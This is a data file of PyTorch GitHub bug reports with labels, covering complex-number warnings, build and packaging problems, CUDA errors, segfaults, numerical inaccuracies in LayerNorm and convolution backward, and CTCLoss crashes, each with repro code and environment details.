"[complex] {lin,log}space: raises warning incorrectly triaged module: complex module: tensor creation","With PR https://github.com/pytorch/pytorch/pull/38875, `linspace` and `logspace` support complex numbers for start and end but they raise noisy warnings even when not required.

```python
import torch
torch.linspace(1j, 2j, steps=100) # Unnecessary warning raised.
torch.linspace(1j, 2j, steps=100, dtype=torch.float) # Valid warning raised/future: throw an error.
```

Warning Message Raised:
```
UserWarning: As either `start` or `stop` is complex, return type will be the complex dtype corresponding to default dtype.In future, this may throw an error when a non-complex dtype arg is passed as input along with complex valued start or end value. (Triggered internally at  ../aten/src/ATen/native/TensorFactories.cpp:468.)
```

More context
https://github.com/pytorch/pytorch/pull/38875#discussion_r586131767

cc @ezyang @anjali411 @dylanbespalko @mruberry @gchanan",True
Python 3.9 installs torch to a wrong version if git commit starts with '0' module: build triaged,"## üêõ Bug

Probably not a big issue, but an interesting one.

In python 3.9, when a torch git commit starts with '0', e.g. `0567988`, a `python setup.py install` would install it to a version of `1.9.0a0+567988` with the leading 0 removed.

A python warning message like this is printed

```
Building wheel torch-1.9.0a0+0567988
/usr/lib/python3.9/site-packages/setuptools/dist.py:452: UserWarning: Normalizing '1.9.0a0+0567988' to '1.9.0a0+567988'
  warnings.warn(tmpl.format(**locals()))
```

The version in pip freeze is ""wrong"",

```
$ pip freeze | grep -i torch
torch==1.9.0a0+567988
```

but the version in `torch.__version__` is correct

```
$ python -c 'import torch; print(torch.__version__)'                    
1.9.0a0+0567988
```

Theoretically, this behavior will trigger with an odd of 1 in 16. ü§î

cc @malfet @seemethere @walterddr @albanD ",True
setup.py sdist does not include third party submodules module: build triaged,"## üêõ Bug

<!-- A clear and concise description of what the bug is. -->
`python setup.py sdist` should produce a tarball of source code that is self-contained and sufficient to compile the project. Currently
- the third-party sources are not included
- the LICENSE file does not include the third party licenses (solved for wheels by gh-51634)
- some other files that are required for building like `version.txt` are not included

This is related to issues gh-50697 and gh-13586

@rgommers

cc @malfet @seemethere @walterddr",True
Illegal memory access in cuda max pooling for large inputs high priority module: cuda triaged module: pooling,"## üêõ Bug

From #52211

```
import torch

x = torch.randn(70, 32, 100, 100, 100, dtype=torch.half, device='cuda')

y = torch.nn.functional.max_pool3d(x, 5)

torch.cuda.synchronize()
```
Env:

Collecting environment information...
PyTorch version: 1.9.0a0+a86027d
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Manjaro Linux (x86_64)
GCC version: (GCC) 10.2.0
Clang version: Could not collect
CMake version: version 3.19.3

Python version: 3.9 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 11.2.67
GPU models and configuration: 
GPU 0: GeForce RTX 2070 SUPER
GPU 1: GeForce GTX 1070 Ti

Nvidia driver version: 460.32.03
cuDNN version: Probably one of the following:
/usr/lib/libcudnn.so.8.0.5
/usr/lib/libcudnn_adv_infer.so.8.0.5
/usr/lib/libcudnn_adv_train.so.8.0.5
/usr/lib/libcudnn_cnn_infer.so.8.0.5
/usr/lib/libcudnn_cnn_train.so.8.0.5
/usr/lib/libcudnn_ops_infer.so.8.0.5
/usr/lib/libcudnn_ops_train.so.8.0.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.5
[pip3] torch==1.9.0a0+a86027d

Root cause https://github.com/pytorch/pytorch/issues/52211#issuecomment-779613083
cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @heitorschueroff @xwang233 
",True
optimize_for_mobile segfaults during forward of mobilenet_v3 high priority module: crash triaged oncall: mobile,"## üêõ Bug

Applying `optimize_for_mobile` into a `mobilenet_v3` from torchvision leads to a segfault on the 3rd forward pass.

## To Reproduce

```python
import torch, torchvision
from torch.utils.mobile_optimizer import optimize_for_mobile

m = torchvision.models.mobilenet_v3_large()
m = torch.jit.script(m)
m = optimize_for_mobile(m)

# run forward 3 times until segfault
m(torch.rand(1, 3, 224, 224))
m(torch.rand(1, 3, 224, 224))
m(torch.rand(1, 3, 224, 224))
```
yielding
```
Segmentation fault: 11
```

I'm using PyTorch `1.8.0.dev20210125` with latest torchvision.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser",True
Display of negative int8 tensor values triaged module: arm,"## üêõ Bug

Display of int8 matrix seems broken. 

## To Reproduce

```
>>> import torch
>>> a = torch.tensor([1, -10], dtype=torch.int8)
>>> a[1]
tensor(-10, dtype=torch.int8)
>>> a
tensor([  1, 246], dtype=torch.int8)
```

## Expected behavior

I expect the tensor to be written as ` tensor([  1, -10], dtype=torch.int8)`

This works fine on pytorch 1.7.1 on x64.

## Environment
```
(pytorch_venv) matthijs@ip-10-100-175-26:~/efficient-deit/deit_lite$ python collect_env.py
Collecting environment information...
PyTorch version: 1.8.0.dev20201210
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (aarch64)
GCC version: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2

Python version: 3.8 (64-bit runtime)
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.0
[pip3] torch==1.8.0.dev20201210
[pip3] torchvision==0.2.2.post3
[conda] Could not collect
```
## Additional context

<!-- Add any other context about the problem here. -->
",True
CUDA error: misaligned address on CUDA 11.2 on Windows on torch.where complex128 module: windows module: cuda triaged,"## üêõ Bug

Discovered in https://github.com/pytorch/pytorch/pull/51598, the failing test is `test_where_scalar_valid_combination_cuda_complex128 `

Minumum repro is:

```python
import torch

x = torch.randn(5, 5, 5, dtype=torch.cdouble, device='cuda')
cond = torch.zeros_like(x, dtype=torch.bool)
torch.where(cond, x, complex(0.0))
```

Fails with

```python
Traceback (most recent call last):
  File ""test/where.py"", line 5, in <module>
    torch.where(cond, x, complex(0.0))
RuntimeError: CUDA error: misaligned address
```

## Environment

```
Collecting environment information...
PyTorch version: 1.8.0a0+dac730a
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Microsoft Windows 10 Enterprise
GCC version: Could not collect
Clang version: Could not collect
CMake version: version 3.17.0-rc1

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: GeForce RTX 3090
GPU 1: GeForce RTX 2080 Ti

Nvidia driver version: 461.40
cuDNN version: C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.2\bin\cudnn_ops_train64_8.dll
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.18.1
[pip3] torch==1.8.0a0+dac730a
[conda] Could not collect
```

cc @ngimel @peterjc123 @maxluk @nbcsm @guyang3532 @gunandrose4u @mszhanyi @skyline75489 @janeyx99 @ptrblck @xwang233 ",True
autograd.grad with set_detect_anomaly(True) will cause memory leak module: autograd module: memory usage triaged,"## üêõ Bug

using `torch.autograd.grad()` with `torch.autograd.set_detect_anomaly(True)` will cause memory leak

## To Reproduce

Run the code snippet below.
It will have about 2MiB GPU memory consumption increasing each iteration.

If comment out the `set_detect_anomaly` line, then there is no memory leak, with constant memory consumption.

```python
import torch
torch.autograd.set_detect_anomaly(True) # if comment out this, no leak
for rep in range(1000):
    batch = torch.ones(10, 30000).cuda().requires_grad_()
    y=batch.norm()
    grad = torch.autograd.grad(
        outputs=y, inputs=batch,
        create_graph=True, retain_graph=True, only_inputs=True)[0]
    print(""memory allocated:"", float(torch.cuda.memory_allocated()/1024**2), ""MiB"")
    pass
```

## Expected behavior

No memory leak with or without `set_detect_anomaly(True)`

## Environment

 - PyTorch Version: 1.7.1
 - OS: Linux
 - How you installed PyTorch: conda, source: `-c pytorch`
 - Python version: 3.8.5
 - CUDA/cuDNN version: cuda11.0

## Additional context

BTW, if replace `y=batch.norm()` with `y=batch.mean()`, then there is no memory leak with or without `set_detect_anomaly`, which makes me very confused.


cc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @soulitzer",True
LayerNorm does not behave as documented high priority module: numerical-stability module: nn triaged module: correctness (silent) module: norms and normalization,"## üêõ Bug

torch.nn.LayerNorm does not behave as documented. It fails for me especially for highly biased/mean-shifted layers. I can't figure out where this instability yields from as it occurs even for weakly mean-shifted layers:

## To Reproduce
Steps to reproduce the behavior:
```
n = torch.nn.LayerNorm(4, eps=1e-5, elementwise_affine=False)
a = torch.randn(5, 4) + 2000  # create random tensor with N=5, L/C=4 and mean=2000, var=1
[[torch.mean(i), torch.var(i, unbiased=False)] for i in n(a)]  # should be near [0, 1]
```
gives:
```
Out[255]: 
[[tensor(0.0002), tensor(0.2006)],
 [tensor(0.0002), tensor(0.1634)],
 [tensor(0.0625), tensor(30822.9492)],
 [tensor(0.0001), tensor(0.0491)],
 [tensor(-0.2500), tensor(48425.8438)]]
```

## Expected behavior
```
def expected_LayerNorm(single_layer1d, eps):
    c = single_layer1d
    return (c - torch.mean(c)) / (torch.sqrt(torch.var(c, unbiased=False).add(eps)))

# comparison for one sample of a
print(n(a[2, :]))
print(expected_LayerNorm(a[2, :], 1e-5))
```
gives:
```
tensor([  22.0000,   72.7500, -285.0000,  190.5000])
tensor([ 0.1249,  0.4133, -1.6235,  1.0852])
```

## Environment
1.7.1+cpu (pip)
Win10


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @mruberry",True
nan comparision for complex numbers feature triaged module: complex module: testing,"Currently, the complex number comparison is done by comparing real and imaginary separately. This is not always correct, because, for example, for `x = -inf+nanj`, on CUDA 11.2, `asin(x) = nan-infj` and on gcc 10.2, `asin(x) = nan+infj`. They are both correct and I don't think one is more correct than the other. However, this way of comparing causes two test failures on my machine:
```
FAILED test/test_unary_ufuncs.py::TestUnaryUfuncsCUDA::test_reference_numerics_asin_cuda_complex128 - AssertionError: False is not true : Scalars failed to compare as equal! Comparing the imaginary part -inf and inf gives a difference of inf, but the allowed difference...
FAILED test/test_unary_ufuncs.py::TestUnaryUfuncsCUDA::test_reference_numerics_asin_cuda_complex64 - AssertionError: False is not true : Scalars failed to compare as equal! Comparing the imaginary part -inf and inf gives a difference of inf, but the allowed difference ...
```

In https://github.com/pytorch/pytorch/pull/50550, I relaxed the nan comparison at `test_unary_ufuncs.py` to
> as long as any of the real or imag is nan, then the whole number is considered as nan and considered as equal. That is `nan + 2j == 3 + nan j`.

However, as @ngimel pointed out in https://github.com/pytorch/pytorch/pull/50550#issuecomment-761905289, this is too relaxed  to make the whole `test_unary_ufuncs.py` compare `nan`s in the relaxed mode. So we need a more detailed plan about relaxed comparison and where should it be used. And this issue is for the purpose of this discussion.

cc: @mruberry 

cc @ezyang @anjali411 @dylanbespalko @mruberry",True
License file in wheels and conda packages does not contain any third-party licenses high priority module: binaries triaged,"## üêõ Bug

License files for relevant code that's used or linked to must be distributed with binaries. There are many license files in `third_party` that must be distributed together with any source or binary distribution.

This was noticed by the conda-forge team in https://github.com/conda-forge/pytorch-cpu-feedstock/issues/34

## To Reproduce

Steps to reproduce the behavior:

1. Download a wheel from, e.g., https://pypi.org/project/torch/1.7.1/#files
2. Unpack it (it's just a zipfile)
3. Inspect the license file in the `torch-1.7.0.dist-info` directory - it's only a copy of https://github.com/pytorch/pytorch/blob/master/LICENSE. No other license files (there are many in `third_party/` are mentioned or present anywhere in the package.


## Expected behavior

The correct way of dealing with this is normally:

- Keep the main `LICENSE` file in the root of the repo unchanged (the default license for new code contributed to the project).
- Keep a separate list of license files present in the repo, in a script or metadata file
- At build time - for any sdist, wheel or conda package - concatenate all those license files together into a single `LICENSE` file. If desired separating the main license from the rest with a _""licenses for bundled code""_ section header.
- Insert that generated license file in the artifacts.

Also, given how often dependencies get added or changed in `third_party`, add some kind of a check that all files named `LICENSE`, `LICENSE.*` or `COPYING` are actually included.



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @seemethere @malfet @walterddr",True
Complex dispatch should be disabled on min/max functions good first issue triaged module: complex,"As of #36377, min/max functions were disabled for complex inputs (via dtype checks), however, min/max kernels are still compiled and dispatched for complex, see e.g.  
https://github.com/pytorch/pytorch/blob/e44b2b72bd4ccecf9c2f6c18d09c11eff446b5a3/aten/src/ATen/native/cpu/ReduceAllOpsKernel.cpp#L77
This dispatch should be disabled, and we should rely on errors produced by dispatch macro to not run those ops on complex, instead of doing redundant dtype checks. 

cc @ezyang @anjali411 @dylanbespalko @mruberry 
cc @t-vi, thanks for reporting!",True
[group conv backward] wrong value calculated high priority module: dependency bug module: nn module: convolution triaged module: correctness (silent),"## üêõ Bug


group convolution backward path result is not correct.
This happens with specific combination of input only
if input and output channels are 24 and groups = 24
stride = 2 and padding = 1

As mentioned below if you change group_val to 25 or 23 , backward path output is correct. only with 24 it's gives wrong results.
Here grad_in is initialized to 1 hence output of backward path will be equal to forward path.



Steps to reproduce the behavior:
```
import torch
group_val = 24
ifm = torch.ones([1, group_val, 6, 6], dtype=torch.float32)
weights = torch.ones([group_val, 1, 3, 3], dtype=torch.float32)
op = torch.nn.Conv2d(
        in_channels=group_val,
        out_channels=group_val,
        kernel_size=[3,3],
        stride=[2,2],
        padding=[1,1],
        dilation=[1,1],
        groups=group_val,
        bias=False,
        padding_mode='zeros'
    )

op.weight.data = weights
res = op(ifm)
print(res)
grad_in = torch.ones(res.shape, dtype=torch.float32)
res.backward(grad_in)
print(op.weight.grad)
```

## Result (adding only 1 channel result as other's are same only):
tensor([[[[4., 6., 6.],
          [6., 9., 9.],
          [4., 6., 6.]]],


## Expected behavior
Tensor([[[[4., 6., 6.],
          [6., 9., 9.],
          [6., 9., 9.]]],



 - PyTorch Version (e.g., 1.0): 1.7.1
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source): NA
 - Python version: 3.6.8
 - CUDA/cuDNN version: cpu
 - GPU models and configuration: na
 - Any other relevant information: na


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @mruberry",True
Segfault with nightly in python 3.9 high priority triaged module: pybind,"## üêõ Bug

A simple code segfaults in nightly builds with python 3.9 but works with python 3.8
## To Reproduce
Content of `Dockerfile`:
```
FROM python:3.9-slim-buster
# works with 3.8
USER root
WORKDIR /root
RUN apt-get update && apt-get install git build-essential --yes
RUN python3 -m pip install --upgrade pip
RUN python3 -m pip install --pre torch==1.8.0.dev20210102+cpu  -f https://download.pytorch.org/whl/nightly/cpu/torch_nightly.html
RUN python3 -m pip install Pillow
RUN git clone https://github.com/pytorch/vision/
ENV PYTHONPATH=./vision
COPY test-backbone.py /
RUN python /test-backbone.py
```

Content of `test-backbone.py`:
```
from torchvision.models import resnet50
import torch


if __name__ == ""__main__"":
    backbone = resnet50(pretrained=True)

    img = torch.randn((2, 3, 256, 288))
    features = backbone(img)
    loss = features.sum()
    loss.backward()
    print(""exiting"")
```

Run `docker build  -t py39:v0 .`

Logs:
```
Step 11/11 : RUN python /test-backbone.py
 ---> Running in 31a88ed05b3d
Downloading: ""https://download.pytorch.org/models/resnet50-19c8e357.pth"" to /root/.cache/torch/hub/checkpoints/resnet50-19c8e357.pth
100.0%
exiting
Segmentation fault (core dumped)
The command '/bin/sh -c python /test-backbone.py' returned a non-zero code: 139

```

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser",True
torch.normal only issues error for negative sigma when shape argument is given high priority triaged module: random module: correctness (silent),"## üêõ Bug

As explained in [this forum thread](https://discuss.pytorch.org/t/how-does-torch-normal-work-with-a-negative-standard-deviation/107571/3) torch.normal only gives an error for negative sigma when there is no size argument given in. Code examples are below.

## To Reproduce

Steps to reproduce the behavior:

This code cause an error...

```
torch.manual_seed(8)
torch.normal(0, -1, (10, ))

# output
# RuntimeError                              Traceback (most recent call last)
# <ipython-input-6-f3bb1e6c1119> in <module>()
    #   1 torch.manual_seed(8)
# ----> 2 torch.normal(0, -1, (10, ))

# RuntimeError: normal_ expects std > 0.0, but found std=-1
```

while this code causes no error...

```
mu = torch.tensor(0.0)
sigma = torch.tensor(-3.0)
torch.normal(mu, sigma)

# ...output
>>> torch.normal(mu, sigma)
tensor(-3.6977)
>>> torch.normal(mu, sigma)
tensor(-3.0448)
>>> torch.normal(mu, sigma)
tensor(-0.2327)
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

I would expect that the error reporting would be consistent and that a negative standard deviation on a singleton sample would also give an error.

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0): 1.7.0+cu110
 - OS (e.g., Linux): 20.04
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source): N/A
 - Python version: 3.8.5



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @fritzo @neerajprad @alicanb @vishwakftw @nikitaved @pbelevich",True
CUDA error: invalid configuration argument during backward through torch.cdist module: cuda triaged module: distance functions,"## üêõ Bug

When back-propagating through torch.cdist operator, the GPU device throws an RuntimeError exception titled:
```
CUDA error: invalid configuration argument.
```

## To Reproduce

Steps to reproduce the behavior:

1. create a Python file 'test.py':
```
import torch

for i in range(510, 520):
    a = torch.zeros((4, i, 32)).normal_(0, 1).cuda()
    b = torch.zeros((4, i, 32)).normal_(0, 1).cuda()
    a.requires_grad = True
    b.requires_grad = True
    c = torch.cdist(a, b, p=1.0)
    print(c.size())
    d = c.mean()
    d.backward()
    print(a.grad.size(), b.grad.size())
```

2. Run command 'python test.py', and it shows the output like:

```
torch.Size([4, 510, 510])
torch.Size([4, 510, 32]) torch.Size([4, 510, 32])
torch.Size([4, 511, 511])
torch.Size([4, 511, 32]) torch.Size([4, 511, 32])
torch.Size([4, 512, 512])
Traceback (most recent call last):
  File ""test.py"", line 13, in <module>
    d.backward()
  File ""/home/wanyu/anaconda3/envs/pt1.7/lib/python3.8/site-packages/torch/tensor.py"", line 221, in backward
    torch.autograd.backward(self, gradient, retain_graph, create_graph)
  File ""/home/wanyu/anaconda3/envs/pt1.7/lib/python3.8/site-packages/torch/autograd/__init__.py"", line 130, in backward
    Variable._execution_engine.run_backward(
RuntimeError: CUDA error: invalid configuration argument
```

## Expected behavior

Wish this issue can be fixed.

## Environment

PyTorch version: 1.7.1
Is debug build: False
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.12.0

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.0.130
GPU models and configuration: 
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti

Nvidia driver version: 450.80.02
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.2
[pip3] torch==1.7.1
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               11.0.221             h6bb024c_0  
[conda] mkl                       2020.2                      256  
[conda] mkl-service               2.3.0            py38he904b0f_0  
[conda] mkl_fft                   1.2.0            py38h23d657b_0  
[conda] mkl_random                1.1.1            py38h0573a6f_0  
[conda] numpy                     1.19.2           py38h54aff64_0  
[conda] numpy-base                1.19.2           py38hfa32c7d_0  
[conda] pytorch                   1.7.1           py3.8_cuda11.0.221_cudnn8.0.5_0    pytorch

## Additional context

It seems to me that this issue is relevant to Issues #27209 #31593 and pull requests #31167 #31593.

And this is just my guessing. The program fails at 'i' being 512, leading to the number of elements as 4 * 512 * 32 = 65,536. The afrementioned issues and pull requests also mentioned that the y/z-dimension of grid (gridDim.y/z, the maximum number of blocks along dimension y/z within each grid) should not exceed 65,535. Maybe this setting goes beyond the maximum value of grid size (gridDim.y > 65,535 or gridDim.z > 65.535).

Wish this can offer help. Thanks!


cc @ngimel",True
TCPStore constructor arguments mismatch unexpected behavior high priority triage review oncall: distributed triaged,"## üêõ Bug

TCPStore arguments are likely not properly type checked. [Documentation](https://pytorch.org/docs/1.7.0/distributed.html#torch.distributed.TCPStore) examples also needs to be updated to use 5 arguments instead of 4.

## To Reproduce

Steps to reproduce the behavior:

```
import torch.distributed as dist
import datetime

dist.TCPStore(""127.0.0.1"", 0, True, timedelta(seconds=30))
```
This is the example given in documentation, which succeeds, but it shouldn't.

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

We expect an error like

```
TypeError: __init__(): incompatible constructor arguments. The following argument types are supported:
    1. torch._C._distributed_c10d.TCPStore(host_name: str, port: int, world_size: int, is_master: bool, timeout: datetime.timedelta = datetime.timedelta(seconds=300))
```

## Environment

 - PyTorch Version (e.g., 1.0): master branch
 - OS (e.g., Linux): Ubuntu 18.04.3 LTS (x86_64)
 - Python version: 3.8

cc: @osalpekar 


cc @ezyang @gchanan @zou3519 @bdhirsh @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @agolynski @SciPioneer @H-Huang @mrzzd",True
Backward pass fails due to CTCLoss in case zero_infinity=True and torch.backends.cudnn.enabled=True module: dependency bug module: cudnn module: loss triaged,"## üêõ Bug

When I use CTCLoss with `zero_infinity=True` and at the same time `torch.backends.cudnn.enabled=True`, and run backward() on its result, the script crashes with the following error:

```
Traceback (most recent call last):
  ...
  File "".../new_ctc_loss_bug.py"", line 29, in <module>
    loss.backward()
  File ""...\Anaconda3\envs\my-env\lib\site-packages\torch\tensor.py"", line 185, in backward
    torch.autograd.backward(self, gradient, retain_graph, create_graph)
  File ""...\Anaconda3\envs\my-env\lib\site-packages\torch\autograd\__init__.py"", line 127, in backward
    allow_unreachable=True)  # allow_unreachable flag
RuntimeError: The size of tensor a (0) must match the size of tensor b (177) at non-singleton dimension 2
Exception raised from infer_size at ..\aten\src\ATen\ExpandUtils.cpp:24 (most recent call first):
00007FFAED8175A200007FFAED817540 c10.dll!c10::Error::Error [<unknown file> @ <unknown line number>]
00007FFAC311B0EB00007FFAC311AED0 torch_cpu.dll!at::infer_size [<unknown file> @ <unknown line number>]
00007FFAC338617400007FFAC3385DC0 torch_cpu.dll!at::native::DispatchStub<void (__cdecl*)(at::Tensor & __ptr64,at::Tensor & __ptr64,at::Tensor const & __ptr64,__int64,bool),at::native::min_stub>::choose_cpu_impl [<unknown file> @ <unknown line number>]
00007FFAC338902400007FFAC3388F00 torch_cpu.dll!at::native::where [<unknown file> @ <unknown line number>]
00007FFAC36AF6A700007FFAC361D060 torch_cpu.dll!at::zeros_out [<unknown file> @ <unknown line number>]
00007FFAC49AB50E00007FFAC485E010 torch_cpu.dll!torch::autograd::GraphRoot::apply [<unknown file> @ <unknown line number>]
00007FFAC3150BFF00007FFAC3146470 torch_cpu.dll!torch::nn::functional::BatchNormFuncOptions::~BatchNormFuncOptions [<unknown file> @ <unknown line number>]
00007FFAC35BC66600007FFAC35B8FA0 torch_cpu.dll!at::bucketize_out [<unknown file> @ <unknown line number>]
00007FFAC361CBF400007FFAC361CB90 torch_cpu.dll!at::where [<unknown file> @ <unknown line number>]
00007FFAC479D46A00007FFAC479CE80 torch_cpu.dll!torch::autograd::Node::`default constructor closure' [<unknown file> @ <unknown line number>]
00007FFAC47AB75B00007FFAC47AB5B0 torch_cpu.dll!torch::autograd::generated::CudnnCtcLossBackward::apply [<unknown file> @ <unknown line number>]
00007FFAC4797E9100007FFAC4797B50 torch_cpu.dll!torch::autograd::Node::operator() [<unknown file> @ <unknown line number>]
00007FFAC4CFF9BA00007FFAC4CFF300 torch_cpu.dll!torch::autograd::Engine::add_thread_pool_task [<unknown file> @ <unknown line number>]
00007FFAC4D003AD00007FFAC4CFFFD0 torch_cpu.dll!torch::autograd::Engine::evaluate_function [<unknown file> @ <unknown line number>]
00007FFAC4D04FE200007FFAC4D04CA0 torch_cpu.dll!torch::autograd::Engine::thread_main [<unknown file> @ <unknown line number>]
00007FFAC4D04C4100007FFAC4D04BC0 torch_cpu.dll!torch::autograd::Engine::thread_init [<unknown file> @ <unknown line number>]
00007FFA66C9090700007FFA66C69FE0 torch_python.dll!THPShortStorage_New [<unknown file> @ <unknown line number>]
00007FFAC4CFBF1400007FFAC4CFB780 torch_cpu.dll!torch::autograd::Engine::get_base_engine [<unknown file> @ <unknown line number>]
00007FFB1C9F10B200007FFB1C9F0F70 ucrtbase.dll!beginthreadex [<unknown file> @ <unknown line number>]
00007FFB1E3B7C2400007FFB1E3B7C10 KERNEL32.DLL!BaseThreadInitThunk [<unknown file> @ <unknown line number>]
00007FFB1EC0D4D100007FFB1EC0D4B0 ntdll.dll!RtlUserThreadStart [<unknown file> @ <unknown line number>]
```

## To Reproduce

Steps to reproduce the behavior:

1. Download the file with variables  https://drive.google.com/file/d/1eltV2WjDVTuRBXO0n6E5t5dkQ3GEW6Qj/view?usp=sharing
1. Run the code:
``` python
import torch
import pickle


assert torch.cuda.is_available() and torch.backends.cudnn.enabled

# https://drive.google.com/file/d/1eltV2WjDVTuRBXO0n6E5t5dkQ3GEW6Qj/view?usp=sharing
with open('ctc_bug.pkl', 'rb') as f:
    variables = pickle.load(f)

log_probs = variables['log_probs'].cuda()
targets = variables['targets'].cpu()
target_lengths = variables['target_lengths'].cuda()

# with `zero_infinity=False` it works well
ctc_loss = torch.nn.CTCLoss(zero_infinity=True).cuda()

assert torch.isfinite(log_probs.max()) and torch.isfinite(log_probs.min())

# with `torch.backends.cudnn.enabled = False` it works well
T, N, C = log_probs.shape
loss = ctc_loss(
    log_probs=log_probs,
    targets=targets,
    input_lengths=torch.full(size=(N,), fill_value=T, dtype=torch.int32).cuda(),
    target_lengths=target_lengths
)
assert torch.isfinite(loss)
loss.backward()

```

## Expected behavior

No crash

## Environment

```
PyTorch version: 1.6.0
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A
OS: Microsoft Windows 10 Home Single Language
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Python version: 3.6 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: GeForce MX150
Nvidia driver version: 451.67
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] numpydoc==0.8.0
[pip3] torch==1.6.0
[pip3] torchvision==0.7.0
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               10.2.89              h74a9793_1  
[conda] libblas                   3.8.0                    16_mkl    conda-forge
[conda] libcblas                  3.8.0                    16_mkl    conda-forge
[conda] liblapack                 3.8.0                    16_mkl    conda-forge
[conda] mkl                       2020.1                      216  
[conda] numpy                     1.19.1           py36h12ee977_2    conda-forge
[conda] numpydoc                  0.8.0                    py36_0  
[conda] pytorch                   1.6.0           py3.6_cuda102_cudnn7_0    pytorch
[conda] torchvision               0.2.1                    pypi_0    pypi

Python 3.6.8
print(torch.cuda.get_device_properties(0))
_CudaDeviceProperties(name='GeForce MX150', major=6, minor=1, total_memory=2048MB, multi_processor_count=3)
print('CUDA version:', torch.version.cuda)
CUDA version: 10.2
print('CUDNN version:', torch.backends.cudnn.version())
CUDNN version: 7605
```

## Additional context

I am also able to reproduce the error with the following configuration:
```
PyTorch version: 1.7.0
Is debug build: True
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A
OS: –ä¬†¬©–Ñ–∞¬Æ–±¬Æ–¥–≤ Windows 10 Pro
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.105
GPU models and configuration: GPU 0: GeForce GTX 1080
Nvidia driver version: 441.28
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] torch==1.7.0
[pip3] torchaudio==0.7.0
[pip3] torchvision==0.8.1
[conda] Could not collect

Python 3.7.9
print(torch.cuda.get_device_properties(0))
_CudaDeviceProperties(name='GeForce GTX 1080', major=6, minor=1, total_memory=8192MB, multi_processor_count=20)
print('CUDA version:', torch.version.cuda)
CUDA version: 10.2
print('CUDNN version:', torch.backends.cudnn.version())
CUDNN version: 7605

```

__But (!) with the following configuration everything works fine:__
```
PyTorch version: 1.1.0
Is debug build: False
CUDA used to build PyTorch: 10.0
ROCM used to build PyTorch: N/A
OS: –ä¬†¬©–Ñ–∞¬Æ–±¬Æ–¥–≤ Windows 10 Pro
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Python version: 3.6 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.105
GPU models and configuration: GPU 0: GeForce GTX 1080
Nvidia driver version: 441.28
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] torch==1.1.0
[conda] Could not collect

Python 3.6.8
print(torch.cuda.get_device_properties(0))
_CudaDeviceProperties(name='GeForce GTX 1080', major=6, minor=1, total_memory=8192MB, multi_processor_count=20)
print('CUDA version:', torch.version.cuda)
CUDA version: 10.0
print('CUDNN version:', torch.backends.cudnn.version())
CUDNN version: 7401

```


cc @csarofeen @ptrblck",True
